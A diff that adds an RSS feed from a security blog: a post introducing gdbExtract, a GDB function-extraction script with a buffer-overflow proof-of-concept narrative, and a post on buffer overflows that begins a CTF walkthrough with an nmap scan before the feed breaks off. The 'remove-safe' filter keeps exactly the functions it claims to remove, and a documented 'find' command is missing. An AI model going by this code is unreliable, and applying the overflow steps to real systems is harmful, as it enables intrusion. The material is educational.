@@ -1,0 +1,1522 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Posts on </title>
+        <link>/posts/</link>
+        <description>Recent content in Posts on </description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en</language>
+        <lastBuildDate>Mon, 27 Nov 2023 13:43:26 -0500</lastBuildDate>
+        <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>gdbExtract</title>
+            <link>/posts/2023/11/gdbextract/</link>
+            <pubDate>Mon, 27 Nov 2023 13:43:26 -0500</pubDate>
+            
+            <guid>/posts/2023/11/gdbextract/</guid>
+            <description>over the past few days, i&amp;rsquo;ve been writing tools that automate cumbersome manual tasks and make my workflow/toolchain cleaner and pushing them to my personal github. the latest one in this series is a tool i call gdbExtract.
+as a security researcher, i spend a lot of time diving deep into the worlds of software security and system analysis. in these domains, binary analysis and reverse engineering are critical tasks, but their challenging and complex nature can come across as intimidating.</description>
+            <content type="html"><![CDATA[<p>over the past few days, i&rsquo;ve been writing tools that automate cumbersome manual tasks and make my workflow/toolchain cleaner and pushing them to my personal github. the latest one in this series is a tool i call <strong><a href="https://github.com/bilals12/gdbExtract">gdbExtract</a></strong>.</p>
+<p>as a security researcher, i spend a lot of time diving deep into the worlds of software security and system analysis. in these domains, binary analysis and reverse engineering are critical tasks, but their challenging and complex nature can come across as intimidating. hackers rely on this fact to conceal a myriad of functions inside binaries that perform unwanted actions, but this tool can help shed some light on them. it&rsquo;s not exactly a replacement for popular and powerful applications like IDA Pro, but it&rsquo;s a quick way to reveal hidden and integral information about binaries.</p>
+<p><strong>gdbExtract</strong> is, first and foremost, an automation tool. it was created to streamline the tedious process of binary analysis. manually examining binaries using tools like <code>GDB</code> requires significant effort and expertise. <code>gdbExtract</code> automates the extraction of crucial function information, transforming a potentially labour-intensive task into a quicker and more reliable process.</p>
+<ul>
+<li>efficiency: automating the extraction process saves time but also ensures consistent results (crucial when dealing with multiple or large binaries).</li>
+<li>structured output: by outputting data in a JSON format, the script turns raw, hard-to-parse information into a structured form, paving the way for more advanced analysis techniques.</li>
+<li>versatility and accessibility: the script is designed to be noob-friendly but can also help seasoned professionals.</li>
+</ul>
+<h1 id="core-functionalities">core functionalities</h1>
+<p><strong>note</strong>: before running, edit the script to point to your specific binary file and output file. there&rsquo;s also a list of &ldquo;unsafe&rdquo; function strings, that you can edit to fit your criteria.</p>
+<p>here&rsquo;s the script in its entirety.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> logging
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> typing <span style="color:#f92672">import</span> List, Dict
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># configure basic logging to display errors and info</span>
+</span></span><span style="display:flex;"><span>logging<span style="color:#f92672">.</span>basicConfig(level<span style="color:#f92672">=</span>logging<span style="color:#f92672">.</span>INFO)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># constants for file paths and binary to be analyzed</span>
+</span></span><span style="display:flex;"><span>BINARY_PATH <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/path/to/binary&#34;</span>
+</span></span><span style="display:flex;"><span>DATA_FILE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;path/to/file.json&#34;</span>
+</span></span><span style="display:flex;"><span>riskyFunctions <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;strcpy&#39;</span>, <span style="color:#e6db74">&#39;strncpy&#39;</span>, <span style="color:#e6db74">&#39;memcpy&#39;</span>, <span style="color:#e6db74">&#39;memset&#39;</span>, <span style="color:#e6db74">&#39;send&#39;</span>, <span style="color:#e6db74">&#39;recv&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># GDB command to list all functions in binary</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># returns output from GDB as string</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run_gdb_command</span>(binary_path: str) <span style="color:#f92672">-&gt;</span> str:
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> subprocess<span style="color:#f92672">.</span>check_output([<span style="color:#e6db74">&#34;gdb&#34;</span>, <span style="color:#e6db74">&#34;-batch&#34;</span>, <span style="color:#e6db74">&#34;-ex&#34;</span>, <span style="color:#e6db74">&#34;info functions&#34;</span>, binary_path])
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">except</span> subprocess<span style="color:#f92672">.</span>CalledProcessError <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>		logging<span style="color:#f92672">.</span>error(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;GDB command failed: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>		sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># parse output from GDB to extract function info</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># returns list of dicts, each containing details of single function</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parse_gdb_output</span>(gdb_output: str) <span style="color:#f92672">-&gt;</span> List[Dict]:
+</span></span><span style="display:flex;"><span>	json_data <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> gdb_output<span style="color:#f92672">.</span>splitlines():
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> line<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#34;0x&#34;</span>): <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>		address, name, signature <span style="color:#f92672">=</span> line<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>split()
+</span></span><span style="display:flex;"><span>		json_data<span style="color:#f92672">.</span>append({<span style="color:#e6db74">&#34;address&#34;</span>: address, <span style="color:#e6db74">&#34;name&#34;</span>: name, <span style="color:#e6db74">&#34;signature&#34;</span>: signature})
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> json_data
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># reads json file and returns content</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read_json_file</span>(file_path: str) <span style="color:#f92672">-&gt;</span> List[Dict]:
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">with</span> open(file_path, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> file:
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> json<span style="color:#f92672">.</span>load(file)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">except</span> <span style="color:#a6e22e">IOError</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>		logging<span style="color:#f92672">.</span>error(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;error reading file </span><span style="color:#e6db74">{</span>file_path<span style="color:#e6db74">}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> []
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">except</span> json<span style="color:#f92672">.</span>JSONDecodeError <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>		logging<span style="color:#f92672">.</span>error(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;error decoding JSON from file </span><span style="color:#e6db74">{</span>file_path<span style="color:#e6db74">}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># writes list of dicts to json file</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write_json_file</span>(file_path: str, data: List[Dict]):
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">with</span> open(file_path, <span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">as</span> file:
+</span></span><span style="display:flex;"><span>			json<span style="color:#f92672">.</span>dump(data, file, indent<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span>) <span style="color:#75715e"># indentation for readability</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">except</span> <span style="color:#a6e22e">IOError</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>		logging<span style="color:#f92672">.</span>error(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;error writing to file </span><span style="color:#e6db74">{</span>file_path<span style="color:#e6db74">}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># main function that extracts function info from binary via GDB</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main_search_code</span>():
+</span></span><span style="display:flex;"><span>	gdb_output <span style="color:#f92672">=</span> run_gdb_command(BINARY_PATH)
+</span></span><span style="display:flex;"><span>	json_data <span style="color:#f92672">=</span> parse_gdb_output(gdb_output)
+</span></span><span style="display:flex;"><span>	write_json_file(DATA_FILE, json_data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># filters out functions deemed &#34;safe&#34; and writes the rest to new json file</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">remove_safe_functions</span>():
+</span></span><span style="display:flex;"><span>	json_data <span style="color:#f92672">=</span> read_json_file(DATA_FILE)
+</span></span><span style="display:flex;"><span>	filtered_json_data <span style="color:#f92672">=</span> [func <span style="color:#66d9ef">for</span> func <span style="color:#f92672">in</span> json_data <span style="color:#66d9ef">if</span> func[<span style="color:#e6db74">&#39;name&#39;</span>] <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> riskyFunctions]
+</span></span><span style="display:flex;"><span>	write_json_file(<span style="color:#e6db74">&#34;filtered_file.json&#34;</span>, filtered_json_data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># combines multiple entries of the same function into a single record</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># tracks number of occurrences of each function</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">combine_data_for_same_function</span>():
+</span></span><span style="display:flex;"><span>	json_data <span style="color:#f92672">=</span> read_json_file(<span style="color:#e6db74">&#34;filtered_file.json&#34;</span>)
+</span></span><span style="display:flex;"><span>	combined_json_data <span style="color:#f92672">=</span> {}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> func <span style="color:#f92672">in</span> json_data:
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> func[<span style="color:#e6db74">&#34;name&#34;</span>] <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> combined_json_data:
+</span></span><span style="display:flex;"><span>			combined_json_data[func[<span style="color:#e6db74">&#34;name&#34;</span>]] <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#34;addresses&#34;</span>: [func[<span style="color:#e6db74">&#34;address&#34;</span>]],
+</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#34;signature&#34;</span>: func[<span style="color:#e6db74">&#34;signature&#34;</span>],
+</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#34;count&#34;</span>: <span style="color:#ae81ff">1</span>,
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>			combined_json_data[func[<span style="color:#e6db74">&#34;name&#34;</span>]][<span style="color:#e6db74">&#34;addresses&#34;</span>]<span style="color:#f92672">.</span>append(func[<span style="color:#e6db74">&#34;address&#34;</span>])
+</span></span><span style="display:flex;"><span>			combined_json_data[func[<span style="color:#e6db74">&#34;name&#34;</span>]][<span style="color:#e6db74">&#34;count&#34;</span>] <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	write_json_file(<span style="color:#e6db74">&#34;combined_file.json&#34;</span>, combined_json_data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># lists all functions in json data file</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">list_functions</span>():
+</span></span><span style="display:flex;"><span>	json_data <span style="color:#f92672">=</span> read_json_file(DATA_FILE)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> func <span style="color:#f92672">in</span> json_data:
+</span></span><span style="display:flex;"><span>		print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>func[<span style="color:#e6db74">&#39;address&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">{</span>func[<span style="color:#e6db74">&#39;name&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># searches for specific function in json data file by address or name</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">search_function</span>():
+</span></span><span style="display:flex;"><span>	json_data <span style="color:#f92672">=</span> read_json_file(DATA_FILE)
+</span></span><span style="display:flex;"><span>	func_addr_name <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;enter a function address or name: &#34;</span>)
+</span></span><span style="display:flex;"><span>	found <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> func <span style="color:#f92672">in</span> json_data:
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> func[<span style="color:#e6db74">&#34;address&#34;</span>] <span style="color:#f92672">==</span> func_addr_name <span style="color:#f92672">or</span> func[<span style="color:#e6db74">&#34;name&#34;</span>] <span style="color:#f92672">==</span> func_addr_name:
+</span></span><span style="display:flex;"><span>			print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;found </span><span style="color:#e6db74">{</span>func[<span style="color:#e6db74">&#39;address&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">{</span>func[<span style="color:#e6db74">&#39;name&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>			found <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> found:
+</span></span><span style="display:flex;"><span>		print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;could not find function with address or name &#39;</span><span style="color:#e6db74">{</span>func_addr_name<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;.&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># main entry point</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># handles cli args and calls corresponding functions</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># check if correct number of args are passed</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>:
+</span></span><span style="display:flex;"><span>		command <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># execute function based on arg</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;search&#34;</span>:
+</span></span><span style="display:flex;"><span>			main_search_code()
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">elif</span> command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;remove-safe&#34;</span>:
+</span></span><span style="display:flex;"><span>			remove_safe_functions()
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">elif</span> command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;combine&#34;</span>:
+</span></span><span style="display:flex;"><span>			combine_data_for_same_function()
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">elif</span> command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;list&#34;</span>:
+</span></span><span style="display:flex;"><span>			list_functions()
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>			logging<span style="color:#f92672">.</span>error(<span style="color:#e6db74">&#34;unknown command. please enter a valid option.&#34;</span>)
+</span></span><span style="display:flex;"><span>			sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>		logging<span style="color:#f92672">.</span>error(<span style="color:#e6db74">&#34;incorrect number of args.&#34;</span>)
+</span></span><span style="display:flex;"><span>		sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># run script only if script is executed as main program</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>	main()
+</span></span></code></pre></div><h2 id="analysis">analysis</h2>
+<p>the script is great for quickly sifting through binaries to identify potential vulnerabilities.</p>
+<ol>
+<li>run <code>python gdbExtract.py search</code> to extract a comprehensive list of functions from the binary.</li>
+<li>running <code>python gdbExtract.py remove-safe</code> afterwards will filter out the &ldquo;known&rdquo; safe functions, narrowing the focus toward more critical areas.</li>
+</ol>
+<p>extracted data might look something like this.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;address&#34;</span>: <span style="color:#e6db74">&#34;0x00401350&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;main&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;signature&#34;</span>: <span style="color:#e6db74">&#34;int main()&#34;</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;address&#34;</span>: <span style="color:#e6db74">&#34;0x00401390&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;helper_function&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;signature&#34;</span>: <span style="color:#e6db74">&#34;void helper_function(int)&#34;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>]
+</span></span></code></pre></div><h2 id="reverse-engineering">reverse engineering</h2>
+<p>it can also dissect a binary so the user can understand its behavior or uncover hidden functionalities.</p>
+<p>after extracting function data, run <code>python gdbExtract.py combine</code> to identify duplicate functions, which might indicate areas of complexity or reuse of code worth exploring.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;helper_function&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;addresses&#34;</span>: [<span style="color:#e6db74">&#34;0x00401390&#34;</span>, <span style="color:#e6db74">&#34;0x00401500&#34;</span>],
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;signature&#34;</span>: <span style="color:#e6db74">&#34;void helper_function(int)&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;count&#34;</span>: <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="education">education</h2>
+<p>it can aid instructors or teachers in explaining the structure and intricacies of binaries in a practical manner.</p>
+<ol>
+<li>run <code>python gdbExtract.py list</code> to explore the different functions within a binary.</li>
+</ol>
+<p>the output can look something like this.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>0x00401350: main
+</span></span><span style="display:flex;"><span>0x00401390: helper_function
+</span></span></code></pre></div><ol start="2">
+<li>run <code>python gdbExtract.py find</code> to search for specific functions. this can demonstrate how functions relate to each other.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>enter a <span style="color:#66d9ef">function</span> address or name: main
+</span></span><span style="display:flex;"><span>found 0x00401350: main
+</span></span></code></pre></div><h1 id="corner-cases">corner cases</h1>
+<p>every tool has its limitations. <code>gdbExtract</code> might not effectively parse binaries that utilize heavily obfuscated code. also, its reliance on GDB means it inherits any limitations present within GDB, such as handling certain types of binaries or specific configs.</p>
+<h1 id="thought-experiment">thought experiment</h1>
+<p>let&rsquo;s say i&rsquo;m a security researcher (i am lol), and i want to assess the security of a legacy communications software that my organization has been using for over a decade. i suspect that the software might contain undiscovered vulnerabilities.</p>
+<ol>
+<li>running the script</li>
+</ol>
+<ul>
+<li>i quickly run <code>python gdbExtract.py search</code> to analyze the binary (specified in <code>BINARY_PATH</code>).</li>
+<li>it will output a comprehensive list of all functions within the binary, complete with their memory addresses and signatures.</li>
+<li>i now have a clear and structured overview of the binary&rsquo;s functions + hours of saved time.</li>
+</ul>
+<ol start="2">
+<li>filtering safe functions</li>
+</ol>
+<ul>
+<li>run <code>python gdbExtract.py remove-safe</code> to streamline the dataset.</li>
+<li>this will isolate functions that warrant closer scrutiny.</li>
+<li>it filters out functions that were pre-identified as &ldquo;safe&rdquo;, based on individual critieria (in this case, i&rsquo;ve excluded standard library functions and those without direct external input handling).</li>
+<li>i now have a manageable list of functions that are labeled &ldquo;high-risk&rdquo; (related to network data handling, memory manipulation, etc).</li>
+</ul>
+<ol start="3">
+<li>identification</li>
+</ol>
+<ul>
+<li>i come across a function called <code>processClientRequest</code>.</li>
+<li>this function handles incoming data packets from network clients, interacting directly with external data.</li>
+</ul>
+<p>diving into the source code of the <code>processClientRequest</code> function, i discover that it uses <code>strcpy</code> to data from the network buffer to a local buffer. this is an immediate red flag, as <code>strcpy</code> doesn&rsquo;t check the size of the destination buffer, making it vulnerable to buffer overflow attacks if the source data exceeds the buffer&rsquo;s capacity. even worse, <code>processClientRequest</code> lacked any checks on the size of the incoming data, meaning it blindly copied whatever was sent over the network into the local buffer.</p>
+<ol start="4">
+<li>constructing a proof-of-concept</li>
+</ol>
+<ul>
+<li>i create a network packet with data significantly larger than the buffer size inside the <code>processClientRequest</code> function (have it contain a specific pattern that&rsquo;s easily identifiable in the memory if it overflows, like <code>AAAAAAAA</code>).</li>
+<li>i then send the packet to a controlled environment (VM) using the legacy software and monitor the memory state of the software as it processes the packet (Immunity Debugger is great for this).</li>
+<li>as expected, the packet causes a buffer overflow and overwrites the adjacent memory.</li>
+<li>this can be confirmed by checking for the pattern in memory locations outside the buffer.</li>
+<li>the packet can be modified to include a simple payload that would then write itself into the program memory.</li>
+</ul>
+<ol start="5">
+<li>remediation</li>
+</ol>
+<ul>
+<li>replace <code>strcpy</code> with <code>strncpy</code>, which includes buffer size as an argument, ensuring copied data does not exceed buffer limit.</li>
+<li>use checks to validate the size of incoming data before processing it.</li>
+<li>review the code with the help of 1 or more code reviewers, and test it using various packet sizes.</li>
+</ul>
+<p>hope this tool finds you well! feel free to leave comments on my <a href="https://github.com/bilals12">github</a> and explore some of my other programs as well.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>gatekeeper (buffer overflows)</title>
+            <link>/posts/2022/10/gatekeeper-buffer-overflows/</link>
+            <pubDate>Sun, 23 Oct 2022 06:59:16 -0400</pubDate>
+            
+            <guid>/posts/2022/10/gatekeeper-buffer-overflows/</guid>
+            <description>lately, i&amp;rsquo;ve been getting more and more into reverse engineering executable programs and using them to gain control of a target machine. it brings to mind what i learned in &amp;ldquo;microcontrollers and microprocessors&amp;rdquo;, a really interesting but tough course i took in my 3rd year of electrical engineering. the course dealt with low-level computing, mainly assembly language (aka ASM), and how it&amp;rsquo;s used to communicate directly with computer architecture and control the usage of memory, on a hardware level.</description>
+            <content type="html"><![CDATA[<p>lately, i&rsquo;ve been getting more and more into reverse engineering executable programs and using them to gain control of a target machine. it brings to mind what i learned in &ldquo;microcontrollers and microprocessors&rdquo;, a really interesting but tough course i took in my 3rd year of electrical engineering. the course dealt with low-level computing, mainly assembly language (aka ASM), and how it&rsquo;s used to communicate directly with computer architecture and control the usage of memory, on a hardware level. understanding memory usages and allocations on that level paved the way for utilizing buffer overflows, a very popular attack that is a result of reverse engineering.</p>
+<p>what exactly is a buffer overflow? well, what is a buffer? buffers are memory storage regions that temporarily hold data while it is transferred from one location to another. a buffer overflow happens when the volume of the data exceeds the storage capacity of the buffer. what happens then is the program, trying to write the data to the desired buffer, overwrites adjacent memory locations (blocks).</p>
+<p>take a buffer for a password that allows a user to log-in to an application. let&rsquo;s say the buffer is designed for an input of 8 bytes. if an input of 10 bytes is received, the program may write the excess data past the buffer boundary.</p>
+<p><img src="/buffer-overflow.png" alt="BOF"></p>
+<h2 id="how-can-buffer-overflows-be-used-as-attacks">how can buffer overflows be used as attacks?</h2>
+<p>if buffer overflows can force some programs to write to adjacent memory blocks, it follows that an attacker can provide a large input that would force the program to write &ldquo;bad&rdquo; code to those blocks. a buffer overflow would change the execution path of the program, and the attacker can force the program and the target machine to execute a desired payload.</p>
+<p>to do this, attackers would need to know the memory layout of a program and details of the buffer, so that they could effectively abuse the storage capacity of the buffer and overwrite areas that also hold executable code. an example of this is overwriting a pointer (an object that points to another area in memory) and point it to a payload.</p>
+<p>there are 2 types of buffer overflow attacks. the first, and most common, is <strong>stack-based buffer overflow</strong>. these leverage stack memory that only exists during the runtime of a function or program.</p>
+<p>the second, less common as it&rsquo;s more difficult to carry out, is a <strong>heap-based buffer overflow</strong>. these involve flooding the memory space allocated for a program beyond memory used for current runtime operations.</p>
+<h2 id="how-can-developers-prevent-buffer-overflows">how can developers prevent buffer overflows?</h2>
+<p>on a code level, devs can prevent buffer overflows by implementing security measures directly inside the code or by using languages that offer built-in protection (like perl, java, javascript, c#).</p>
+<p>on an OS level, runtime protection measures can help thwart buffer overflows.</p>
+<ul>
+<li><strong>address space randomization (ASLR)</strong>: since buffer overflows require locations of executable code, randomizing address spaces would make this near impossible to carry out.</li>
+<li><strong>data execution prevention</strong>: this flags certain areas of memory as executable or non-executable, and would thus stop an attack from running code in a non-executable region.</li>
+<li><strong>structured exception handler overwrite protection (SEHOP)</strong>: structured exception handling (SEH) is a built-in system that manages software and hardware exceptions. <strong>SEHOP</strong> stops malicious code from attacking structured exception handling and thus prevents an attacker from using the SEH overwrite technique. SEH overwrites are achieved using a stack-based buffer overflow to overwrite an exception registration record, stored on a thread&rsquo;s stack.</li>
+</ul>
+<h2 id="gatekeeper">gatekeeper</h2>
+<p>i found this really cool challenge made by an acquaintance, which utilizes a stack-based buffer overflow as a central technique to collect the flags on a target machine. there is no further information provided, which made this challenge one of the most intense and interesting ones i&rsquo;ve cracked so far.</p>
+<p>upon getting my tun0 address (10.18.12.60) and the target&rsquo;s address (10.10.10.172), i performed an nmap scan.</p>
+<pre tabindex="0"><code>nmap 10.10.10.172
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-20 15:47 EDT
+Nmap scan report for 10.10.90.136
+Host is up (0.14s latency).
+Not shown: 989 closed ports
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
